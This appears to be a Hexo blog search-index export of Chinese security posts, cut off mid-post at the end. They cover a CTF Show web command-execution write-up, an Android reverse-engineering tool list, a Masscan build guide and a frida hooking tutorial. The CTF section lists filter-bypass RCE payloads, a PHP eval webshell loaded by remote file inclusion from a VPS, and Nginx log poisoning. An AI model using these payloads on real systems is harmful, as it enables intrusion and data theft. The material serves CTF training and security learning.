<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTF Show  WEB入门 命令执行Write Up</title>
    <link href="/2021/09/16/CTF-Show-WEB%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWrite-Up/"/>
    <url>/2021/09/16/CTF-Show-WEB%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWrite-Up/</url>
    
    <content type="html"><![CDATA[<h3 id="WEB-29"><a href="#WEB-29" class="headerlink" title="WEB 29"></a>WEB 29</h3><p>这关过滤了flag关键字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=system(<span class="hljs-string">&quot;ls&quot;</span>);  <span class="hljs-comment">// 查看当前文件夹下的文件</span><br>/?c=system(<span class="hljs-string">&quot;cat f*&quot;</span>);  <span class="hljs-comment">// 查看flag.php文件内容</span><br></code></pre></td></tr></table></figure><h3 id="WEB-30"><a href="#WEB-30" class="headerlink" title="WEB 30"></a>WEB 30</h3><p>这关过滤了flag、system和php关键字</p><h4 id="方法一：passthru-函数"><a href="#方法一：passthru-函数" class="headerlink" title="方法一：passthru()函数"></a>方法一：passthru()函数</h4><p>passthru()：执行外部命令并且显示原始输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=passthru(<span class="hljs-string">&quot;ls&quot;</span>);<br>/?c=passthru(<span class="hljs-string">&quot;cat f*&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="方法二：echo命令"><a href="#方法二：echo命令" class="headerlink" title="方法二：echo命令"></a>方法二：echo命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">echo</span> `ls`;<br>/?c=<span class="hljs-keyword">echo</span> `cat f*`;<br></code></pre></td></tr></table></figure><h4 id="方法三：exec命令"><a href="#方法三：exec命令" class="headerlink" title="方法三：exec命令"></a>方法三：exec命令</h4><p>还有个思路三，将flag.php复制为1.txt直接访问即可，我想着，执行次操作是不是需要查看一下当前路径下的文件呢 -，-</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/?c=exec(`cp fla* 1.txt`);    <br>/1.txt<br></code></pre></td></tr></table></figure><h3 id="WEB-31"><a href="#WEB-31" class="headerlink" title="WEB 31"></a>WEB 31</h3><p>这关过滤的是flag、system、php、cat、sort、shell以及点、空格、单引号</p><p>解题思路：</p><p>1、system()可以替换为passthru()替换；</p><p>2、cat可以使用tac/more/less替换（查看源码和不需要查看源码的区别）；</p><p>3、空格可以使用tab（%09）替换；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=passthru(<span class="hljs-string">&quot;tac%09f*&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="WEB-32"><a href="#WEB-32" class="headerlink" title="WEB 32"></a>WEB 32</h3><p>在31关的基础上过滤了echo、分号和左括号</p><p>解题思路：</p><p>1、?&gt;来代替分号</p><p>2、使用include+伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-variable">$nice</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-</span><br>encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="WEB-33"><a href="#WEB-33" class="headerlink" title="WEB 33"></a>WEB 33</h3><p>在32关的基础上过滤了双引号</p><p>payload跟上一关差不多，取消双引号即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-</span><br>encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="WEB-34"><a href="#WEB-34" class="headerlink" title="WEB 34"></a>WEB 34</h3><p>在33关的基础上过滤了冒号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="WEB-35"><a href="#WEB-35" class="headerlink" title="WEB 35"></a>WEB 35</h3><p>在34关的基础上过滤了”&lt;”和”=”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br>/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="WEB-36"><a href="#WEB-36" class="headerlink" title="WEB 36"></a>WEB 36</h3><p>在35关的基础上过滤了数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[url]<span class="hljs-meta">?&gt;</span>&amp;url=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="WEB-37"><a href="#WEB-37" class="headerlink" title="WEB 37"></a>WEB 37</h3><h4 id="方法一：通过data协议来执行php代码，读取flag"><a href="#方法一：通过data协议来执行php代码，读取flag" class="headerlink" title="方法一：通过data协议来执行php代码，读取flag"></a>方法一：通过data协议来执行php代码，读取flag</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;cat f*&quot;);<span class="hljs-meta">?&gt;</span></span><br>/?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="方法二：利用文件包含漏洞"><a href="#方法二：利用文件包含漏洞" class="headerlink" title="方法二：利用文件包含漏洞"></a>方法二：利用文件包含漏洞</h4><p>1、远程vps创建文件shell.txt，内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hacker&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2、蚁剑添加连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//be6e0b8e-31c3-4489-895b-f8e27360656b.challenge.ctf.show:8080/?c=http://www.vps.com/shell.txt</span><br></code></pre></td></tr></table></figure><p>3、读取/var/www/html/flag.php文件，获得flag</p><h3 id="WEB-38"><a href="#WEB-38" class="headerlink" title="WEB 38"></a>WEB 38</h3><p>过滤了php关键字</p><h4 id="方法一：data伪协议"><a href="#方法一：data伪协议" class="headerlink" title="方法一：data伪协议"></a>方法一：data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><h4 id="方法二：文件包含漏洞"><a href="#方法二：文件包含漏洞" class="headerlink" title="方法二：文件包含漏洞"></a>方法二：文件包含漏洞</h4><p>同WEB 37</p><h4 id="方法三：Nginx日志getshell"><a href="#方法三：Nginx日志getshell" class="headerlink" title="方法三：Nginx日志getshell"></a>方法三：Nginx日志getshell</h4><p>1、burp抓取数据包，在UA添加一句话后门</p><img src=/img/CTF-SHOW-WEB入门-代码执行/38-1.png><p>2、访问nginx日志文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">view-source:http:<span class="hljs-comment">//0406781d-bfc1-40a7-922b-1fe227444101.challenge.ctf.show:8080/?c=../../../../../../../..//var/log/nginx/access.log</span><br></code></pre></td></tr></table></figure><p>我们添加的php一句话已经被解析了，可以看到下面三个引号要在上面上个引号稍微后一点点</p><img src=/img/CTF-SHOW-WEB入门-代码执行/38-2.png><p>3、蚁剑连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0406781d-bfc1-40a7-922b-1fe227444101.challenge.ctf.show:8080/?c=../../../../../../../..//var/log/nginx/access.log</span><br></code></pre></td></tr></table></figure><p>在/var/www/html/flag.php里面即可找到flag</p><h3 id="WEB-39"><a href="#WEB-39" class="headerlink" title="WEB 39"></a>WEB 39</h3><p>data://text/plain, 这样就相当于执行了php语句， .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;cat f*&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="WEB-40"><a href="#WEB-40" class="headerlink" title="WEB 40"></a>WEB 40</h3><p>无参数RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// payload1</span><br><span class="hljs-comment">// 随机读取文件，需要多读几次</span><br>/?c=<span class="hljs-keyword">echo</span>(readfile(array_rand(array_flip(scandir(pos(localeconv()))))));<br><br><span class="hljs-comment">// payload2</span><br>/?c=<span class="hljs-keyword">eval</span>(end(current(get_defined_vars())));&amp;b=highlight_file(%<span class="hljs-number">27</span>flag.php%<span class="hljs-number">27</span>);<br><br><span class="hljs-comment">// payload3</span><br>/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br><br><span class="hljs-comment">// payload4</span><br>/?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>整理一下一些常用的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">getchwd()：返回当前工作目录。<br>scandir()：返回指定目录中的文件和目录的数组。<br>dirname()：返回路径中的目录部分。<br>chdir()：改变当前的目录。<br>readfile()：输出一个文件<br>current()：返回数组中的当前单元, 默认取第一个值<br>pos()：current()的别名<br>next()：将内部指针指向数组中的下一个元素，并输出。<br>end()：将内部指针指向数组中的最后一个元素，并输出。<br>array_rand()：返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br>array_flip()、array_flip() ：用于反转/交换数组中所有的键名以及它们关联的键值。<br>array_slice()：在数组中根据条件取出一段值，并返回<br>chr()：从指定的 ASCII 值返回字符。<br>hex2bin()：转换十六进制字符串为二进制字符串<br>getenv()：获取一个环境变量的值(在<span class="hljs-number">7.1</span>之后可以不给予参数)<br></code></pre></td></tr></table></figure><p>连接：<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#2019_decade">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#2019_decade</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向常用的工具汇总</title>
    <link href="/2021/08/29/Android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
    <url>/2021/08/29/Android%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="JDK环境"><a href="#JDK环境" class="headerlink" title="JDK环境"></a>JDK环境</h3><ul><li>JDK<ul><li>由于逆向过程中很多的软件是使用java进行开发或者依赖于java运行环境的，因此JDK的安装是必要的</li><li>JDK下载地址：<a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></li></ul></li></ul><h3 id="反编译工具"><a href="#反编译工具" class="headerlink" title="反编译工具"></a>反编译工具</h3><ul><li>AndroidKiller<ul><li><p>对APK进行反编译</p></li><li><p>需要配置JDK环境</p></li><li><p>程序截图 </p><img src="/img/Android逆向常用的工具汇总/1.jpg"></li></ul></li><li>Android官网逆向助手少月版V2018<ul><li><p>对APK进行编译、反编译和签名等操作，功能比较多</p></li><li><p>程序截图 </p><img src="/img/Android逆向常用的工具汇总/3.jpg"></li></ul></li><li>jadx<ul><li><p>对APK进行反编译</p></li><li><p>项目地址：<a href="https://github.com/skylot/jadx">https://github.com/skylot/jadx</a></p></li><li><p>程序截图</p><img src="/img/Android逆向常用的工具汇总/4.jpg"></li></ul></li></ul><h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><ul><li>IDA Pro7<ul><li>动态调试工具</li><li>特点：调试so文件比较方便</li></ul></li><li>IDEA<ul><li><p>用来对smali代码进行调试，需要添加smali插件</p></li><li><p>插件下载地址如下，下载后自行查找IDEA插件安装教程即可</p><ul><li><a href="https://bitbucket.org/JesusFreke/smali/downloads/">https://bitbucket.org/JesusFreke/smali/downloads/</a></li><li><a href="https://github.com/JesusFreke/smalidea">https://github.com/JesusFreke/smalidea</a></li></ul></li><li><p>程序截图 </p><img src="/img/Android逆向常用的工具汇总/8.jpg"></li></ul></li><li>JEB<ul><li><p>需要配置JDK环境</p></li><li><p>特点：调试smali代码比较方便</p></li><li><p>程序截图 </p><img src="/img/Android逆向常用的工具汇总/2.jpg"></li></ul></li></ul><h3 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h3><ul><li>Android Helper<ul><li><p>检测apk的一些信息</p></li><li><p>程序截图 </p><img src="/img/Android逆向常用的工具汇总/5.jpg"></li></ul></li><li>PKID查壳<ul><li><p>识别apk的加壳程序，有exe和jar包两种</p></li><li><p>exe </p><img src="/img/Android逆向常用的工具汇总/6.jpg"></li><li><p>jar </p><img src="/img/Android逆向常用的工具汇总/7.jpg"> </li></ul></li><li>模拟器<ul><li>雷电模拟器<ul><li>官网下载</li><li>特点<ul><li><strong>修改apk后无需签名，支持覆盖安装</strong></li><li><strong>动态调试稳定</strong></li><li>安装慢</li></ul></li></ul></li><li>夜神模拟器<ul><li>官网下载</li><li>特点<ul><li><strong>安装快</strong></li><li><strong>支持xposed</strong></li><li>adb调试端口为127.0.0.1:62001，jeb附加的时候经常找不到模拟器，需要手动adb connect一下</li></ul></li></ul></li><li>逍遥模拟器<ul><li>官网下载</li><li>特点<ul><li><strong>安装块</strong></li><li><strong>支持xposed</strong></li><li>adb调试端口为127.0.0.1:21503，jeb附加的时候经常找不到模拟器，需要手动adb connect一下</li></ul></li></ul></li></ul></li></ul><h3 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h3><ul><li>Burp Suite<ul><li>自行下载并搜索抓包教程</li></ul></li><li>Fiddler<ul><li>自行下载并搜索抓包教程</li></ul></li><li>HTTP Debugger Pro<ul><li>自行下载并搜索抓包教程</li></ul></li></ul><h3 id="项目上传"><a href="#项目上传" class="headerlink" title="项目上传"></a>项目上传</h3><p>所有文件已上传至<a href="https://github.com/M0untainShley/Android-Reverse-Tools">https://github.com/M0untainShley/Android-Reverse-Tools</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows下的Masscan安装编译</title>
    <link href="/2021/08/28/Windows%E4%B8%8B%E7%9A%84Masscan%E5%AE%89%E8%A3%85%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/28/Windows%E4%B8%8B%E7%9A%84Masscan%E5%AE%89%E8%A3%85%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>需要安装的软件</p><ul><li>Microsoft Visual Studio10.0：Microsoft Visual Studio（简称VS）是美国微软公司的开发工具包系列产品，在下载完masscan后需要用他来对代码进行编译，读者可在网上自行下载</li></ul><h3 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h3><p>masscan：一款端口扫描工具，号称能够在5分钟内完成对整个互联网所有的IP进行扫描</p><h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><ol><li>下载masscan，我们将其下载在E盘下的masscan文件夹内</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 可能日后该项目的地址会发生变化，可在github上自行搜索clone即可</span><br>❯ git <span class="hljs-built_in">clone</span> https://github.com/robertdavidgraham/masscan.git<br>Cloning into <span class="hljs-string">&#x27;masscan&#x27;</span>...<br>remote: Enumerating objects: 5286, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (173/173), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (95/95), <span class="hljs-keyword">done</span>.<br>remote: Total 5286 (delta 97), reused 132 (delta 78), pack-reused 5113<br>Receiving objects: 100% (5286/5286), 3.38 MiB | 2.28 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (3670/3670), <span class="hljs-keyword">done</span>.<br><br><span class="hljs-comment"># 查看目录结构</span><br>❯ <span class="hljs-built_in">cd</span> .\masscan\<br>❯ ls<br><br>    Directory: E:\masscan<br><br>Mode                 LastWriteTime         Length Name<br>----                 -------------         ------ ----<br>d----           2021/8/28     8:51                bin<br>d----           2021/8/28     8:51                data<br>d----           2021/8/28     8:51                debian<br>d----           2021/8/28     8:51                doc<br>d----           2021/8/28     8:51                src<br>d----           2021/8/28     8:51                tmp<br>d----           2021/8/28     8:51                vs10<br>d----           2021/8/28     8:51                xcode4<br>-a---           2021/8/28     8:51             23 .gitattributes<br>-a---           2021/8/28     8:51             37 .gitignore<br>-a---           2021/8/28     8:51            444 .travis.yml<br>-a---           2021/8/28     8:51            558 LICENSE<br>-a---           2021/8/28     8:51           3242 Makefile<br>-a---           2021/8/28     8:51          24413 README.md<br>-a---           2021/8/28     8:51           2150 VULNINFO.md<br></code></pre></td></tr></table></figure><ol start="2"><li><p>打开Microsoft Visual Studio10.0进行编译操作</p><p>使用Microsoft Visual Studio10.0打开下载后的masscan中的<strong>vs10/masscan.sln</strong></p><img src="/img/Windows下的Masscan安装编译/1.jpg"><p>编译配置</p><img src="/img/Windows下的Masscan安装编译/2.jpg"><p>右击masscan项目，选择重新生成</p><img src="/img/Windows下的Masscan安装编译/3.jpg"><p>编译成功，箭头所指为工具所在位置</p><img src="/img/Windows下的Masscan安装编译/4.jpg"></li><li><p>运行masscan</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ <span class="hljs-built_in">cd</span> E:\masscan\bin\<br>❯ .\masscan.exe<br>usage:<br>masscan -p80,8000-8100 10.0.0.0/8 --rate=10000<br> scan some web ports on 10.x.x.x at 10kpps<br>masscan --nmap<br> list those options that are compatible with nmap<br>masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;<br> save results of scan <span class="hljs-keyword">in</span> binary format to &lt;filename&gt;<br>masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;<br> <span class="hljs-built_in">read</span> binary scan results <span class="hljs-keyword">in</span> &lt;filename&gt; and save them as xml <span class="hljs-keyword">in</span> &lt;savefile&gt;<br></code></pre></td></tr></table></figure><ol start="4"><li>添加环境变量</li></ol><p>添加环境变量后我们就可以随处打开cmd使用masscan了，添加环境变量在此处不做介绍</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>信息收集</tag>
      
      <tag>端口扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida+frida-demo hook技术学习</title>
    <link href="/2021/08/25/frida+frida-demo%20hook%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/08/25/frida+frida-demo%20hook%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>安卓手机客户端测试的时候遇到root检测无法绕过，想找找相关的资料学学，网上看到了frida和frida-demo的练习环境，就自己尝试着做了一下，frida-demo这个apk有以下三关：</p><ul><li>PIN码暴力破解</li><li>root环境检测绕过</li><li>加密函数的key获取</li></ul><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>一台root权限的安卓测试机，我的测试机是谷歌的nexus 5</li><li>测试机安装frida-demo.apk，安装过程在此不做描述…</li><li>PC安装frida，frida-tools</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ pip install frida frida-tools<br>...<br><br><span class="hljs-comment"># 安装成功</span><br>❯ frida --version<br>15.0.18<br></code></pre></td></tr></table></figure><ol start="4"><li>下载adb并且添加环境变量</li></ol><p>在<a href="https://www.androiddevtools.cn/">https://www.androiddevtools.cn/</a> 下载platform-tool即可，解压后里面有adb.exe，添加环境变量，在cmd中输出如下内容即为成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ adb --version<br>Android Debug Bridge version 1.0.41<br>Version 31.0.3-7562133<br>Installed as E:\AndroidTools\platform-tools\adb.exe<br></code></pre></td></tr></table></figure><ol start="5"><li>连接测试机</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ adb devices<br>List of devices attached<br>0701bb16d00b1ede        device  <span class="hljs-comment"># 设备的编号</span><br></code></pre></td></tr></table></figure><ol start="6"><li><p>下载frida-server</p><p>选择arm64的，x86开头的是用于模拟器的，下载之后解压文件，重命名为frida-server</p></li></ol><img src="/img/frida+frida-demo hook技术学习/1.png"><ol start="7"><li><p>将下载下来的frida-server上传到测试机的/data/mytools目录下</p><p>在上传之前，我们先在/sdcard下创建一个mytools文件作为一个中转的存放文件的位置，使用adb push因为权限的问题是没办法直接上传到/data目录下的，但是同时/sdcard下的文件又不能添加x权限，因此<strong>我们使用adb push将文件上传到/sdcard/mytools这个中转目录，再传输到/data/mytools文件下</strong></p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 当前的路径</span><br>❯ <span class="hljs-built_in">pwd</span><br><br>Path<br>----<br>C:\Users\ShleyCpt\Desktop<br><br><span class="hljs-comment"># adb命令连接测试机，创建frida-server临时存放目录/sdcard/mytools</span><br>❯ adb shell<br>shell@hammerhead:/ $ su -<br>root@hammerhead:/ <span class="hljs-comment"># mkdir /sdcard/mytools</span><br>root@hammerhead:/ <span class="hljs-comment"># exit</span><br>shell@hammerhead:/ $ <span class="hljs-built_in">exit</span><br><br><span class="hljs-comment"># adb命令上传frida-server</span><br>❯ adb push .\frida-server .\frida-server64 /sdcard/mytools<br>.\frida-server: 1 file pushed, 0 skipped. 3.7 MB/s (19801584 bytes <span class="hljs-keyword">in</span> 5.172s)<br>.\frida-server64: 1 file pushed, 0 skipped. 4.6 MB/s (44843536 bytes <span class="hljs-keyword">in</span> 9.346s)<br>2 files pushed, 0 skipped. 3.9 MB/s (64645120 bytes <span class="hljs-keyword">in</span> 15.663s)<br><br><span class="hljs-comment"># sdcard作为一个临时软件存放目录，在sdcard中是不能为软件赋予执行权限的</span><br>❯ adb shell<br>shell@hammerhead:/ $ su -<br>root@hammerhead:/ <span class="hljs-comment"># cd /sdcard/mytools/</span><br>root@hammerhead:/sdcard/mytools <span class="hljs-comment"># ls -l</span><br>-rw-rw---- root     sdcard_rw 19801584 2021-08-27 15:23 frida-server<br>-rw-rw---- root     sdcard_rw 44843536 2021-08-27 15:23 frida-server64<br><br><span class="hljs-comment"># 创建/data/mytools并且将/sdcard/mytools/下的文件复制到该目录下</span><br>root@hammerhead:/sdcard/mytools <span class="hljs-comment"># mkdir /data/mytools</span><br>root@hammerhead:/sdcard/mytools <span class="hljs-comment"># cp frida-server* /data/mytools/</span><br>root@hammerhead:/data/mytools <span class="hljs-comment"># cd /data/mytools/</span><br>root@hammerhead:/data/mytools <span class="hljs-comment"># chmod 755 frida-server*</span><br>root@hammerhead:/data/mytools <span class="hljs-comment"># ls -l</span><br>-rwxr-xr-x root     root     19801584 2021-08-27 15:31 frida-server<br>-rwxr-xr-x root     root     44843536 2021-08-27 15:31 frida-server64<br><br><span class="hljs-comment"># 运行/frida-server</span><br>root@hammerhead:/data/mytools <span class="hljs-comment"># ./frida-server</span><br>...<br></code></pre></td></tr></table></figure><p>打开另一个终端，查看frida-server是否执行成功</p><figure class="highlight 